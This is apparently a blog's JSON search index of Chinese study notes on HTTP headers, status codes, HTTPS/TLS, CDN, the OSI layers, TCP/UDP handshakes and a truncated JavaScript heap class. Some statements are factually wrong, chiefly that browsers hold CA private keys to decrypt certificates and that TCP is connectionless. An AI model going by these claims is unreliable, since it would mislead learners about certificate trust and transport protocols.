Content-MD5：是一串由MD5算法生成的值，其目的在于检查报文主体在传输过程中是否保持完整，以及确认传输到达。 Content-Range:针对范围请求，返回响应时使用的首部字段，能告知客户端作为相应返回的实体的哪个部分符合范围请求。 Content-Type:说明了实体主体内对象的媒体类型，该字段用type/subtype形式赋值。 实体缓存首部 Etag：就是一个对象（比如URL）的标志值，就一个对象而言，比如一个html文件，如果被修改了，其Etag也会别修改，所以，ETag的作用跟Last-Modified的作用差不多，主要供WEB服务器判断一个对象是否改变了。比如前一次请求某个html文件时，获得了其 ETag，当这次又请求这个文件时，浏览器就会把先前获得ETag值发送给WEB服务器，然后WEB服务器会把这个ETag跟该文件的当前ETag进行对比，然后就知道这个文件有没有改变了。 Expires：WEB服务器表明该实体将在什么时候过期，对于过期了的对象，只有在跟WEB服务器验证了其有效性后，才能用来响应客户请求。是 HTTP/1.0 的头部。例如：Expires：Sat, 23 May 2009 10:02:12 GMT Last-Modified：WEB服务器认为对象的最后修改时间，比如文件的最后修改时间，动态页面的最后产生时间等等。例如：Last-Modified：Tue, 06 May 2008 02:42:43 GMT 实体编码首部 Accept-Encoding：客户端发送给服务器，表明自己可以接受哪些编码（gzip、compress、deflate、identity） Content-Encoding: 服务器发送给客户端，告诉客户端以哪种方式解码 （gzip、compress、deflate、identity） 4、HTTP 状态码 100 Continue 200 OK 201 Created 请求已经被实现，而且有一个新的资源已经依据请求的需要而建立，且其 URI 已经随Location 头信息返回 (常规使用场景是作为 PUT 请求的返回值) 202 Accepted 服务器已接受请求，但尚未处理 204 No Content（无内容） 206 Partial Content（使用断点续传） 301 Moved Permanently 302 Move Temporarily 304 Not Modified 400 Bad Request（不合规范的请求） 401 Unauthorized（未授权） 403 Forbidden（禁止访问） 404 Not Found（文件找不到） 500 Internal Server Error（内部服务器错误） 503 Service Unavailable（服务不可用） 504 Gateway Timeout 5、Get 与 Post 请求的区别 Get 请求能缓存，Post 不能 Post 相对 Get 安全一点点，因为Get 请求都包含在 URL 里，且会被浏览器保存历史纪录，Post 不会，但是在抓包的情况下都是一样的。 Post 可以通过 request body来传输比 Get 更多的数据，Get 没有这个技术 URL有长度限制，会影响 Get 请求，但是这个长度限制是浏览器规定的，不是 RFC 规定的 Post 支持更多的编码类型且不对数据类型限制","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"HTTPS 协议","slug":"HTTP/HTTPS 协议","date":"2021-01-14T07:39:00.000Z","updated":"2021-04-30T07:20:06.353Z","comments":true,"path":"2021/01/14/HTTP/HTTPS 协议/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/HTTPS%20%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"HTTPS 协议1、背景介绍HTTP的请求过程中，客户端与服务器之间没有任何身份确认的过程，数据全部明文传输，容易遭到黑客攻击 HTTP 的主要风险如下： 窃听风险：黑客可以获知通信内容 篡改风险：黑客可以修改通信内容 冒充风险：黑客可以冒充他人身份参与通信 HTTPS：（Secure Hypertext Transfer Protocol）安全超文本传输协议，它基于 HTTP 开发，用于在客户计算机和服务器之间交换信息。它使用安全套接字层 (SSL) 进行信息交换。 一句话总结 HTTPS的过程：HTTPS 要使客户端与服务器端的通信过程得到安全保证，必须使用的对称加密算法，但是协商对称加密算法的过程，需要使用非对称加密算法来保证安全，然而直接使用非对称加密的过程本身也不安全，会有中间人篡改公钥的可能性，所以客户端与服务器不直接使用公钥，而是使用数字证书签发机构颁发的证书来保证非对称加密过程本身的安全。这样通过这些机制协商出一个对称加密算法，就此双方使用该算法进行加密解密。从而解决了客户端与服务器端之间的通信安全问题。 2、SSLSSL (Secure Sockets Layer 安全套接层)，及其继任者传输层安全（Transport Layer Security，TLS）是为网络通信提供安全及数据完整性的一种安全协议。TLS 与 SSL 在传输层对网络连接进行加密。 SSL协议位于 TCP/I P协议与各种应用层协议之间，为数据通讯提供安全支持。SSL协议可分为两层： SSL记录协议（SSL Record Protocol）：它建立在可靠的传输协议（如TCP）之上，为高层协议提供数据封装、压缩、加密等基本功能的支持。 SSL握手协议（SSL Handshake Protocol）：它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。 特点： 认证用户和服务器，确保数据发送到正确的客户机和服务器； 加密数据以防止数据中途被窃取； 维护数据的完整性，确保数据在传输过程中不被改变。 3、加密算法3.1 对称加密算法在对称加密算法中，数据发信方将明文（原始数据）和加密密钥一起经过特殊加密算法处理后，使其变成复杂的加密密文发送出去。收信方收到密文后，若想解读原文，则需要使用加密用过的密钥及相同算法的逆算法对密文进行解密，才能使其恢复成可读明文。 在对称加密算法中，使用的密钥只有一个，发收信双方都使用这个密钥对数据进行加密和解密，这就要求解密方事先必须知道加密 密钥 和 加密算法。 特点：加密强度大，难以破解，加密解密速度快 常见的对称加密算法：AES 、RC4 、3DES 3.2 非对称加密算法非对称加密算法需要两个密钥：公开密钥（publickey）和私有密钥（privatekey）。 如果用公开密钥对数据进行加密，只有用对应的私有密钥才能解密； 如果用私有密钥对数据进行加密，那么只有用对应的公开密钥才能解密； 特点：性能较低，但是安全性超强 常见的非对称加密算法：RSA 、DSA/DSS、 DH 、、RSA、DSA、ECDSA、 DH 3.3 Hash 算法说明：将任意长度的信息转换为较短的固定长度的值，通常其长度要比信息小得多，且算法不可逆。 常见的 hash 算法：MD5、SHA-1、SHA-2、SHA-256 结论：非对称算法 强度复杂、安全性依赖于算法与密钥但是由于其 算法复杂，而使得加密解密速度没有对称加密解密的速度快，公钥加密目前只能用来作 密钥交换 或者 内容签名，不适合用来做应用层传输内容的加解密会话密钥客户端在认证完服务器。获得服务器的公钥之后，利用该公钥与服务器进行加密通信，协商出两个会话密钥，分别是用于加密客户端往服务端发送数据的客户端会话密钥，和用于加密服务端往客户端发送数据的服务端会话密钥。在已有服务器公钥，可以加密通讯的前提下，还要协商两个对称密钥的原因，是因为非对称加密相对复杂度更高，在数据传输过程中，使用对称加密，可以节省计算资源。另外，会话密钥是随机生成，每次协商都会有不一样的结果，所以安全性也比较高。 使用场景： 甲方生成一对密钥并将其中的公用密钥公开；得到该公用密钥的乙方使用该密钥对机密信息进行加密后再发送给甲方；甲方再用自己保存的另一把专用密钥对加密后的信息进行解密。 甲方可以使用乙方的公钥对机密信息进行签名后再发送给乙方；乙方再用自己的私匙对数据进行验签。 4、数据加密的方式方式 1：使用对称加密 客户端发送给服务器的数据使用 对称秘钥 加密，服务器使用 对称秘钥 解密 服务器发送给客户端的数据使用 对称秘钥 加密，客户端使用 对称秘钥 解密 缺点：需维护大量的秘钥、秘钥容易泄露 方式 2：使用非对称加密 客户端发送给服务器的数据使用 公钥 加密，服务器使用 私钥 解密 服务器发送给客户端的数据使用 私钥 加密，客户端使用 公钥 解密 缺点：公钥是公开的，服务器发送给客户端的数据的数据容易被截获 方式 3：同时使用对称加密、非对称加密 客户端发送给服务器的 对称加密算法、对称秘钥 使用 公钥 加密 服务器发送给客户端的数据用此 对称加密算法、对称秘钥 加密，对称秘钥 协商完成 客户端发送给服务器的数据使用 协商的对称秘钥 加密，服务器使用 协商的对称秘钥 解密 服务器发送给的客户端数据使用 协商的对称秘钥 加密，客户端使用 协商的对称秘钥 解密 问题：公钥加密（非对称加密）计算量太大，如何减少耗用的时间？解决方法：每一次对话（session），客户端和服务器端都生成一个 对话密钥（双方协商的对称秘钥），用它来加密信息。由于 对话密钥 是对称加密，所以运算速度非常快，而服务器公钥只用于加密 对话密钥 本身，这样就减少了加密运算的消耗时间。 很明显，方式 3 比较合适 HTTP 的数据加密，但依然有 两个 问题： 客户端如何获得公钥 如何确认服务器是真实的而不是黑客 获取公钥的过程并不能保证安全，似乎又得重新进行一次加密的过程（先有鸡还是先有蛋的问题），So what to do… 5、SSL 证书SSL证书，也称为服务器 SSL 证书，是遵守 SSL 协议的一种数字证书，由全球信任的证书颁发机构 (Certificate Authority，简称 CA) 验证服务器身份后颁发。将SSL证书安装在网站服务器上，可实现网站身份验证和数据加密传输双重功能。 SSL 证书能同时解决了 公钥获取 问题和 黑客冒充 问题 每种支持 HTTPS 的浏览器都内置的许多 CA 中心的公钥信息，CA 中心是浏览器开发商信任的授权机构，它为有需要的网站颁发用于验证的服务器公钥，颁发前 CA 中心应尽量确认申请者的身份，并确保颁发的服务器证书确实是由该域名使用的。至于CA中心的具体实现上，就是在创建一个新的 HTTPS 连接时，浏览器端收到服务器的签名公钥，验证签名后（除非 CA 的私钥泄漏，否则签名无法被伪造），检查证书里被签名的 cn 项（Common Name，常用名称）或 subjectAltName 项的值，由此确认对方确实是浏览器真正要访问的服务器，并确认该公钥不在 CA 机构的公开撤销列表里（例如，证书是假冒或欺诈手段获取到的）。如果所有检查都通过了，浏览器就可以用这个公钥加密信息并传回给服务器端，通过这种方式，确认只有特定的接收者才能对加密信息进行解密。 SSL 证书是 CA 中心用自己 私钥 对申请者的信息进行加密的数据，当用户访问服务器是 SSL 证书从服务器下载到本地，然后浏览器内置了权威的 CA 中心的 私钥，用此 私钥 解密 SSL 证书中的数据，如果客户端计算出来的证书编号（使用证书中的 签名算法 进行计算）与证书中的证书编号相同，则验证通过。 SSL 证书包含的具体内容如下： Version 版本 Serial Number序列号 Algorithm ID 算法标识 Issuer 颁发者 Validity 有效期 Not Before 有效起始日期 Not After 有效终止日期 Subject 使用者 Subject Public Key Info 使用者公钥信息 Public Key Algorithm公钥算法 Subject Public Key公钥 Issuer Unique Identifier (Optional) 颁发者唯一标识（CA 中心） Subject Unique Identifier (Optional) 使用者唯一标识 Extensions (Optional) 扩展 … Certificate Signature Algorithm 证书签名算法（MD5 算法） Certificate Signature 证书签名 验证步骤： 首先浏览器读取证书中的证书所有者、有效期等信息进行一一校验 浏览器开始查找操作系统中已内置的受信任的证书发布机构 CA，与服务器发来的证书中的颁发者 CA 比对，用于校验证书是否为合法机构颁发 如果找不到，浏览器就会报错，说明服务器发来的证书是不可信任的。 如果找到，那么浏览器就会从操作系统中取出颁发者 CA 的公钥，然后对服务器发来的证书里面的签名进行解密 浏览器使用相同的 hash 算法计算出服务器发来的证书的 hash 值，将这个计算的 hash 值与证书中签名做对比 对比结果一致，则证明服务器发来的证书合法，没有被冒充 此时浏览器就可以读取证书中的公钥，用于后续加密了 认证信息 —哈希算法—&gt; 摘要 —私钥加密—&gt; 数字签名 6、HTTPS 的特点HTTPS 优点 所有信息都是加密传播，黑客无法窃听 具有校验机制，一旦被篡改，通信双方会立刻发现 配备身份证书，防止身份被冒充 HTTPS 缺点 SSL 证书费用很高，以及其在服务器上的部署、更新维护非常繁琐 HTTPS 降低用户访问速度（多次握手） 网站改用 HTTPS 以后，由HTTP 跳转到 HTTPS 的方式增加了用户访问耗时（多数网站采用 302 跳转） HTTPS 涉及到的安全算法会消耗 CPU 资源，需要增加大量机器（https 访问过程需要加解密）","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"CDN","slug":"HTTP/CDN","date":"2021-01-14T07:38:00.000Z","updated":"2021-04-30T07:19:28.147Z","comments":true,"path":"2021/01/14/HTTP/CDN/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/CDN/","excerpt":"","text":"CDN1. 基本原理CDN 是将源站内容分发至最接近用户的节点，使用户可就近取得所需内容，提高用户访问的响应速度和成功率。解决因分布、带宽、服务器性能带来的访问延迟问题，适用于站点加速、点播、直播等场景。 最简单的CDN 网络由一个 DNS 服务器和几台缓存服务器组成： 当用户点击网站页面上的内容URL，经过本地 DNS 系统解析， DNS 系统会最终将域名的解析权交给CNAME指向的CDN 专用 DNS 服务器。 CDN 的 DNS 服务器将CDN 的全局负载均衡设备 IP 地址返回用户。 用户向 CDN 的全局负载均衡设备发起内容 URL 访问请求。 CDN 全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域负载均衡设备，告诉用户向这台设备发起请求。 区域负载均衡设备会为用户选择一台合适的缓存服务器提供服务，选择的依据包括：根据用户IP地址，判断哪一台服务器距用户最近；根据用户所请求的 URL 中携带的内容名称，判断哪一台服务器上有用户所需内容；查询各个服务器当前的负载情况，判断哪一台服务器尚有服务能力。基于以上这些条件的综合分析之后，区域负载均衡设备会向全局负载均衡设备返回一台缓存服务器的 IP 地址。 全局负载均衡设备把服务器的IP地址返回给用户。 用户向缓存服务器发起请求，缓存服务器响应用户请求，将用户所需内容传送到用户终端。如果这台缓存服务器上并没有用户想要的内容，而区域均衡设备依然将它分配给了用户，那么这台服务器就要向它的上一级缓存服务器请求内容，直至追溯到网站的源服务器将内容拉到本地。 2. 优点 实现跨运营商、跨地域的全网覆盖 保障网站安全、增强可靠性，防止网络攻击 异地备份 节约成本投入（人力、财力） 当网站更新时，如果 CDN 节点上数据没有及时更新，即便用户再浏览器使用 Ctrl +F5 的方式使浏览器端的缓存失效，也会因为 CDN 边缘节点没有同步最新数据而导致用户访问异常 3. 应用场景 网站站点/应用加速 视音频点播/大文件下载分发加速 移动应用加速 CDN 执行响应的基本流程：用户的请求到达边缘服务器时，如果发现可用的缓存，则直接以缓存的内容响应，称为命中缓存，否则，请求将在 CDN 内部上行，直到命中合适的缓存或抵达内容网站自有的服务器，由其进行响应，称为回源，源服务器 处理完回源请求后，其响应将循原路返回，途中，CDN 各级节点将按照约定的方式对其进行缓存，以备下次使用。这是 。 4. 常见操作4.1 CDN 回源常规的 CDN 都是回源的。即当有用户访问某一个 URL 的时候，如果被解析到的那个 CDN 节点没有缓存响应的内容，或者是缓存已经到期，就会回源站去获取。如果没有人访问，那么 CDN 节点不会主动去源站拿的。 源站内容有更新的时候，源站主动把内容推送到 CDN 节点 4.2 缓存刷新缓存刷新是指淘汰 CDN 节点上的旧文件，重新获取文件的新版本 CDN 节点缓存的资源没有过期，但是基于客户的业务要求，需要更新CDN节点上缓存资源，刷新就是强制删除CDN节点缓存内容。用户请求这些资源时，CDN 节点需要重新回源拉取资源，保证响应的资源与源站一致。 刷新类型分为目录刷新和URL刷新。URL刷新是直接将节点上缓存的资源删除。对于目录刷新，会将节点上的文件资源过期，会同源站对比 Last-Modified 时间 4.3 缓存预热缓存预热是指首次发布的文件，主动从源站推送到 CDN，让用户访问到 CDN 时不用回客户的源站命中。 正常情况下，首批下载的用户体验很差，因为都集中访问源站主机，源站主机的CPU利用率和带宽会跑的很高。第一批用户下载完成后，CDN 中也能够缓存了一份，第二批用户下载就直接在 CDN 中命中，速度比第一批快得多 通过预热功能，将资源从源站推送到各 CDN 节点，提前先缓存起来。等正式使用时第一批用户也能从 CDN 中快速获取到资源 5. 常见名称A记录：是用来指定主机名（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的 web server 上。 CNAME记录：即：别名记录，这种记录允许您将多个名字映射到另外一个域名。 Origin Server：即源站，是 CDN 之前的客户真正的服务器。 CDN 节点：也称作边缘节点、Cache节点等，是相对于网络的复杂结构而提出的一个概念，指距离最终用户接入具有较少的中间环节的网络节点，对最终接入用户有较好的响应能力和连接速度。其作用是将访问量较大的网页内容和对象保存在服务器前端的专用cache设备上，以此来提高网站访问的速度和质量。 用户向浏览器提供要访问的域名，浏览器对域名进行解析，由于 CDN 参与后，对域名解析过程进行了调整，解析的结果不再一个IP地址，而是该域名对应的 CNAME 。但 CNAME 无法完成最终内容的获取，所以，浏览器需要再次对获得的 CNAME 进行解析，以得到实际的 IP 地址。在此过程中，CDN会根据用户的实际地理位置信息解析对应的 IP 地址，使得用户能就近访问。这个过程中， CNAME的主要作用是配合CDN的负载均衡系统将CNAME背后对应的节点IP分配给不同的用户去访问。","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"TCP/IP 协议","slug":"HTTP/TCP-IP 协议","date":"2021-01-14T07:34:00.000Z","updated":"2021-04-30T07:23:28.326Z","comments":true,"path":"2021/01/14/HTTP/TCP-IP 协议/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/TCP-IP%20%E5%8D%8F%E8%AE%AE/","excerpt":"","text":"TCP/IP 协议网络七层模型，从上至下依次为： 应用层 ：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等。数据单位为报文。 表示层 ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。 会话层 ：建立及管理会话。 传输层 ：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。 网络层 ：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。 数据链路层 ：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。 物理层 ：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"TCP 与 UDP","slug":"HTTP/TCP  与 UDP","date":"2021-01-14T07:32:00.000Z","updated":"2021-04-30T07:12:05.005Z","comments":true,"path":"2021/01/14/HTTP/TCP  与 UDP/","link":"","permalink":"https://xuxb.github.io/2021/01/14/HTTP/TCP%20%20%E4%B8%8E%20UDP/","excerpt":"","text":"TCP 与 UDP当 IP 包通过路由将数据传输到目的地时，会根据 TCP 或 UDP 包头中的源端口和目的端口信息，请求和获取不同的应用。也就是说，不管 TCP 还是 UDP，都含有网络服务必须的源端口和目的端口信息，以建立和实现网络传输服务。 在网络中，有些服务，如 HTTP、FTP 等，对数据的可靠性要求较高，在使用这些服务时，必须保证数据包能够完整无误的送达；而另外一些服务，如 DNS、即时聊天工具等，并不需要这么高的可靠性，高效率和实时性才是它们所关心的。根据这两种服务不同的需求，也就诞生了面向连接的 TCP 协议，以及面向无连接的 UDP 协议。 怎么理解 TCP 的面向连接和 UDP 的无连接（不面向连接）？TCP 关心分组是否准确送达，甚至仔细到给每个分组编号并收到目的端的确认才继续发送后续的分组，而 UDP 则不然，它只负责把分组封装好后直接发送到链路上，至于目的端收到与否并不关心。 TCP 的面向连接指对话之前需要先建立一个会话，而 UDP 无连接直接发送消息（类似于打电话和写信） UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。 TCP 协议为了更容易传送大数据才把数据分割，而且 TCP 协议能够确认数据最终是否送达到对方 一、UDPUDP（User Data Protocol，用户数据报协议）是一种无连接的协议，提供面向事务的简单不可靠信息传送服务。UDP 协议的主要作用是将网络数据流量压缩成数据包的形式。一个典型的数据包就是一个二进制数据的传输单位，每一个数据包的前 8 个字节用来包含报头信息，剩余字节则用来包含具体的传输数据。 面向报文UDP 是一个面向报文（报文可以理解为一段段的数据）的协议。意思就是 UDP 只是报文的搬运工，不会对报文进行任何拆分和拼接操作。 具体来说 在发送端，应用层将数据传递给传输层的 UDP 协议，UDP 只会给数据增加一个 UDP 头标识下是 UDP 协议，然后就传递给网络层了 在接收端，网络层将数据传递给传输层，UDP 只去除 IP 报文头就传递给应用层，不会任何拼接操作 不可靠性 UDP 是无连接的，也就是说通信不需要建立和断开连接。 UDP 也是不可靠的。协议收到什么数据就传递什么数据，并且也不会备份数据，对方能不能收到是不关心的 UDP 没有拥塞控制，一直会以恒定的速度发送数据。即使网络条件不好，也不会对发送速率进行调整。这样实现的弊端就是在网络条件不好的情况下可能会导致丢包，但是优点也很明显，在某些实时性要求高的场景（比如电话会议）就需要使用 UDP 而不是 TCP。 高效因为 UDP 没有 TCP 那么复杂，需要保证数据不丢失且有序到达。所以 UDP 的头部开销小，只有八字节，相比 TCP 的至少二十字节要少得多，在传输数据报文时是很高效的。 头部包含了以下几个数据 两个十六位的端口号，分别为源端口（可选字段）和目标端口 整个数据报文的长度 整个数据报文的检验和（IPv4 可选 字段），该字段用于发现头部信息和数据中的错误 传输方式UDP 不止支持一对一的传输方式，同样支持一对多，多对多，多对一的方式，也就是说 UDP 提供了单播，多播，广播的功能。 特点 UDP 是一个非连接的协议，传输数据之前源端和终端不建立连接，当它想传送时就简单地去抓取来自应用程序的数据，并尽可能快地把它扔到网络上。在发送端，UDP传送数据的速度仅仅是受应用程序生成数据的速度、计算机的能力和传输带宽的限制；在接收端，UDP把每个消息段放在队列中，应用程序每次从队列中读一个消息段。 由于传输数据不建立连接，因此也就不需要维护连接状态，包括收发状态等，因此一台服务机可同时向多个客户机传输相同的消息。 UDP 信息包的标题很短，只有8个字节，相对于 TCP 的 20 个字节信息包的额外开销很小。 吞吐量不受拥挤控制算法的调节，只受应用软件生成数据的速率、传输带宽、源端和终端主机性能的限制。 UDP 使用尽最大努力交付，即不保证可靠交付，因此主机不需要维持复杂的链接状态表（这里面有许多参数）。 UDP 是面向报文的。发送方的UDP对应用程序交下来的报文，在添加首部后就向下交付给IP层。既不拆分，也不合并，而是保留这些报文的边界，因此，应用程序需要选择合适的报文大小。 UDP 主要用在实时性要求高以及对质量相对较弱的地方，如流媒体、实时消息 二、TCPTCP（Transmission Control Protocol，传输控制协议） TCP（Transmission Control Protocol，传输控制协议）是面向连接的协议，即在收发数据前，必须和对方建立可靠的连接。TCP是主机对主机层的传输控制协议，提供可靠的连接服务，采用三次握手确认建立一个连接： 头部对于 TCP 头部来说，以下几个字段是很重要的 Sequence Number，(顺序号码)这个序号保证了 TCP 传输的报文都是有序的，对端可以通过序号顺序的拼接报文 Acknowledgement Number，(确认号码)这个序号表示数据接收端期望接收的下一个字节的编号是多少，同时也表示上一个序号的数据已经收到 Window Size，窗口大小，表示还能接收多少字节的数据，用于流量控制 标识符 URG=1：(urgent 紧急) 该字段为一表示本数据报的数据部分包含紧急信息，是一个高优先级数据报文，此时紧急指针有效。紧急数据一定位于当前数据包数据部分的最前面，紧急指针标明了紧急数据的尾部。 ACK=1：(acknowledgement 确认)该字段为一表示确认号字段有效。此外，TCP 还规定在连接建立后传送的所有报文段都必须把 ACK 置为一。 PSH=1：(push 传送)该字段为一表示接收端应该立即将数据 push 给应用层，而不是等到缓冲区满后再提交。 RST=1：(reset 重置)该字段为一表示当前 TCP 连接出现严重问题，可能需要重新建立 TCP 连接，也可以用于拒绝非法的报文段和拒绝连接请求。 SYN=1：(synchronous 建立联机) 当SYN=1，ACK=0时，表示当前报文段是一个连接请求报文。当SYN=1，ACK=1时，表示当前报文段是一个同意建立连接的应答报文。 FIN=1：(finish 结束)该字段为一表示此报文段是一个释放连接的请求报文。 状态机HTTP 是无连接的，所以作为下层的 TCP 协议也是无连接的，虽然看似 TCP 将两端连接了起来，但是其实只是两端共同维护了一个状态 LISTEN - 侦听来自远方 TCP 端口的连接请求；SYN-SENT -在发送连接请求后等待匹配的连接请求；SYN-RECEIVED - 在收到和发送一个连接请求后等待对连接请求的确认；ESTABLISHED- 代表一个打开的连接，数据可以传送给用户；FIN-WAIT-1 - 等待远程 TCP 的连接中断请求，或先前的连接中断请求的确认；FIN-WAIT-2 - 从远程 TCP 等待连接中断请求；CLOSE-WAIT - 等待从本地用户发来的连接中断请求；CLOSING -等待远程 TCP 对连接中断的确认；LAST-ACK - 等待原来发向远程 TCP 的连接中断请求的确认；TIME-WAIT -等待足够的时间以确保远程 TCP 接收到连接中断请求的确认；CLOSED - 没有任何连接状态； 建立连接（三次握手）在 TCP 协议中，主动发起请求的一端为客户端，被动连接的一端称为服务端。不管是客户端还是服务端，TCP 连接建立完后都能发送和接收数据，所以 TCP 也是一个全双工的协议。 第一次握手：主机A发送位码为syn＝1，随机产生seq number=1234567的数据包到服务器，主机B由SYN=1知道，A要求建立联机，A进入 SYN_SEND状态，等待主机B确认； 第二次握手：主机B收到请求后要确认联机信息，向A发送ack number=(主机A的seq+1)，syn=1，ack=1，随机产生seq=7654321的包，此时主机B进入SYN_RECV状态。； 第三次握手：主机A收到后检查ack number是否正确，即第一次发送的seq number+1，以及位码ack是否为1，若正确，主机A会再发送ack number=(主机B的seq+1)，ack=1，主机B收到后确认seq值与ack=1则连接建立成功。此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。 两支军队，分别由两个将军领导，正在准备攻击一个坚固的城市。两支军队都驻扎在城市旁边的两个不同的山谷里。两军之间隔着第三个山谷，两个将军想要通讯的唯一方法就是穿过第三个山谷传送信件。问题是，第三个山谷被城市的守卫军占据，并且经此传送的信件可能会被守卫军截获。 第一次握手：A蓝数据成功到达B蓝，B蓝收到A蓝的通知“你准备好攻打红色部队了吗？” 第二次握手：B蓝回复A蓝，“我准备好了！”。 假设回复成功到达A蓝，但是此时B蓝并不知道A蓝是否成功收到了它的回复，因此它并不敢轻举妄动，假设A蓝并没有收到回复，没有出兵，那B蓝岂不是会全军覆没。于是很有必要进行第三次握手。 第三次握手：A蓝回复B蓝，“我知道你准备好了，开打吧！” 当B蓝收到这个确认之后，就可以开始出兵了。理论上来说，两军的沟通永远停不下来，因为没有办法确认最后一次数据包是否成功到达对方，所以三次握手也并不是绝对的可靠，可以选择四次，甚至多次握手，但是考虑到开销，选择三次握手，能保证足够的可靠性了。 断开连接（四次挥手）由于 TCP 连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个 FIN 来终止这个方向的连接。收到一个 FIN 只意味着这一方向上没有数据流动，一个 TCP 连接在收到一个 FIN 后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。 TCP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在 socket 编程中，任何一方执行 close() 操作即可产生挥手操作。 客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。 服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。 服务器B关闭与客户端A的连接，发送一个FIN给客户端A。 客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。","categories":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"https://xuxb.github.io/tags/HTTP/"}]},{"title":"堆","slug":"数据结构/数据结构-堆(非线性结构)","date":"2020-11-14T07:48:00.000Z","updated":"2021-05-03T09:23:25.567Z","comments":true,"path":"2020/11/14/数据结构/数据结构-堆(非线性结构)/","link":"","permalink":"https://xuxb.github.io/2020/11/14/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E5%A0%86(%E9%9D%9E%E7%BA%BF%E6%80%A7%E7%BB%93%E6%9E%84)/","excerpt":"","text":"堆概念堆通常是一个可以被看做一棵树的数组对象，堆的实现通过构造二叉堆，为二叉树的一种。 逻辑结构为二叉树，存储结构为数组 性质 任意节点小于（或大于）它的所有子节点 堆总是一棵完全树。即除了最底层，其他层的节点都被元素填满，且最底层从左到右填入。 将根节点最大的堆叫做最大堆或大根堆，根节点最小的堆叫做最小堆或小根堆。 其中每个结点的值都不大于其孩子结点的值，这样的堆称为小根堆。其中每个结点的值都不小于其孩子结点的值，这样的堆称为大根堆。 优先队列也完全可以用堆来实现，操作是一模一样的，例如最大优先队列，无论入队顺序，当前最大的元素优先出队。 堆的根节点中存放的是最大或者最小元素，但是其他节点的排序顺序是未知的。例如，在一个最大堆中，最大的那一个元素总是位于 index 0 的位置，但是最小的元素则未必是最后一个元素。唯一能够保证的是最小的元素是一个叶节点，但是不确定是哪一个。 作用 构建优先队列 堆排序 快速找出最大/最小值 实现大根堆堆的每个节点的左边子节点索引是 i * 2 + 1，右边是 i * 2 + 2，父节点是 (i - 1) /2。 堆有两个核心的操作，分别是 shiftUp 和 shiftDown。 shiftUp：添加元素，核心思路是一路将节点与父节点对比大小，如果比父节点大，就和父节点交换位置。 shiftDown：删除根节点，核心思路是先将根节点和末尾交换位置，然后移除末尾元素。接下来循环判断父节点和两个子节点的大小，如果子节点大，就把最大的子节点和父节点交换。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152class MaxHeap &#123; constructor() &#123; this.heap = [] &#125; size() &#123; return this.heap.length &#125; empty() &#123; return this.size() == 0 &#125; add(item) &#123; this.heap.push(item) this._shiftUp(this.size() - 1) &#125; removeMax() &#123; this._shiftDown(0) &#125; getParentIndex(k) &#123; return parseInt((k - 1) / 2) &#125; getLeftIndex(k) &#123; return k * 2 + 1 &#125; _shiftUp(k) &#123; // 如果当前节点比父节点大，就交换 while (this.heap[k] &gt; this.heap[this.getParentIndex(k)]) &#123; this._swap(k, this.getParentIndex(k)) // 将索引变成父节点 k = this.getParentIndex(k) &#125; &#125; _shiftDown(k) &#123; // 交换首位并删除末尾 this._swap(k, this.size() - 1) 